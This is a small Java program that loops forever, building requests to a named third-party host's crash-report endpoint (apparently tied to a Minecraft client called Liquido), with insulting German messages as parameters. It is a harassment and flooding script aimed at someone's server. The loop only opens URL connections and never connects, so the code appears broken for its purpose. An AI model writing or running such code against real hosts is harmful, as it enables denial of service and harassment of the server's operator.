import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

public class Main {

    public static void main(String[] args) throws IOException {
        while(true) {
            /*messages that shown*/
            final String user = "Lösch dich";
            final String error = "imagine Account Stealen";
            final String description = "Wilder Skid Code bre";

            /*connection to his server*/
            final URL url = new URL("http://supercraftalex.000webhostapp.com/liquido/crash.php?user=" + replace(user) + "&errs=" + replace(error) + "&exc=" + replace(description));
            url.openConnection();
        }
    }

    /* from the original Liquido Client*/
    public static String replace(String replacement) {
        return replacement.replaceAll("\n", "-----").replaceAll("\\{", "").replaceAll("\\}", "").replaceAll(" ", "%20").replaceAll("<", "-").replaceAll(">", "-").replaceAll("@", "%40");
    }

}
